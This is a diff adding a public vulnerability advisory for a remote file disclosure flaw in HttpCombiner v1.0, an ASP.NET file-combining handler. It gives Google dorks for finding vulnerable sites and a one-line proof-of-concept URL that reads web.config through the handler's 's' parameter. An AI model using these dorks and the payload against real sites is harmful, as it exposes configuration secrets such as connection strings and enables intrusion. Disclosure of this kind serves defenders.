@@ -1,0 +1,39 @@
+# Exploit Title: HttpCombiner ASP.NET Remote File Disclosure Vulnerability
+# Google Dork: [filetype:txt intext:HttpCombiner.ashx]
+# Date: 2014-10-10
+# Exploit Author: Hoang Anh Thai
+# Vendor Homepage: https://myfirstsamplepagebyilyasforassign.googlecode.com/files/HttpCombiner-v1.zip
+# Reference: http://www.codeproject.com/KB/aspnet/HttpCombine.aspx
+# Affected Versions: HttpCombiner v1.0
+# Tested on: Windows 7 / Chrome & Internet Explorer
+
+Description:
+============
+
+An HTTP handler that combines multiple CSS, Javascript or URL into one response for faster page load. It can combine, compress and cache response which results in faster page load and better scalability of web application 
+
+It's a good practice to use many small Javascript and CSS files instead of one large Javascript/CSS file for better code maintainability, but bad in terms of website performance. Although you should write your Javascript code in small files and break large CSS files into small chunks but when browser requests those javascript and css files, it makes one Http request per file. Every Http Request results in a network roundtrip form your browser to the server and the delay in reaching the server and coming back to the browser is called latency. So, if you have four javascripts and three css files loaded by a page, you are wasting time in seven network roundtrips. Within USA, latency is average 70ms. So, you waste 7x70 = 490ms, about half a second of delay. Outside USA, average latency is around 200ms. So, that means 1400ms of waiting. Browser cannot show the page properly until Css and Javascripts are fully loaded. So, the more latency you have, the slower page loads.
+
+You can reduce the wait time by using a CDN. Read my previous blog post about using CDN. However, a better solution is to deliver multiple files over one request using an HttpHandler that combines several files and delivers as one output. So, instead of putting many <script> or <link> tag, you just put one <script> and one <link> tag, and point them to the HttpHandler. You tell the handler which files to combine and it delivers those files in one response. This saves browser from making many requests and eliminates the latency. 
+
+This Http Handler reads the file names defined in a configuration and combines all those files and delivers as one response. It delivers the response as gzip compressed to save bandwidth. Moreover, it generates proper cache header to cache the response in browser cache, so that, browser does not request it again on future visit.
+
+
+PoC:
+===
+
+Google search: [inurl:robots.txt intext:HttpCombiner.ashx]
+
+Result: The robots.txt file contains information "...Disallow: /css/HttpCombiner.ashx..."
+
+Exploit view source web.config: http://[host]/css/HttpCombiner.ashx?s=~/web.config&t=text/xml
+
+
+
+
+
+
+
+VULNERABILITY LABORATORY RESEARCH TEAM
+DOMAIN: securitydaily.net
+CONTACT: whitehat@hotmail.com
